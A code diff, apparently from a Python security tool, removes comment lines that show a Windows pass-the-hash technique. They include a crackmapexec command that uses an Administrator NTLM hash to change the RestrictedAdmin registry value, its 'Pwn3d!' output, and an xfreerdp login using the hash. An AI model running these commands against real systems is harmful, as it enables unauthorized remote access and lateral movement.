@@ -1,15 +1,5 @@
 import re, argparse
 
-
-#cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
-#SMB 10.0.0.200 445 DESKTOP [*] Windows 10.0 Build 18362 x64 (name:DESKTOP) (domain:DESKTOP) (signing:False) (SMBv1:False)
-#SMB 10.0.0.200 445 DESKTOP [+] DESKTOP\Administrator 8846F7EAEE8FB117AD06BDD830B7586C (Pwn3d!)
-#SMB 10.0.0.200 445 DESKTOP [+] Executed command
-#SMB 10.0.0.200 445 DESKTOP The operation completed successfully.
-
-#xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
-
-
 def banner():
 	print("""                               
                
